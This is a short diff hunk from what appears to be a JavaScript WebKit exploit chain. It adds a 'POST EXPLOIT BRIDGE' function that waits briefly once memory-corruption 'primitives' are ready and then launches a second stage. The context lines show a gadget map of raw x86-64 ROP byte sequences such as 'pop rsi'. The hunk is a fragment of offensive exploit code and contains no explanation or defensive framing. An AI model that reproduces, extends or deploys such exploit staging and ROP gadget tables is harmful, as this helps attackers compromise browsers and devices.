@@ -784,6 +784,18 @@ window.stage2 = async function stage2() {
     }
 };
 
+// ====================== POST EXPLOIT BRIDGE ======================
+window.postExpl = async function postExpl() {
+	console.log("[postExpl] Primitives ready → Launching Stage 2");
+	
+	// Small delay to let primitives stabilize
+	await new Promise(r => setTimeout(r, 100));
+	
+	if (typeof window.stage2 === "function") {
+		await window.stage2();
+	}
+};
+
 var gadgetmap_wk = {
 	"ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
 	"pop rsi": [0x5e, 0xc3],
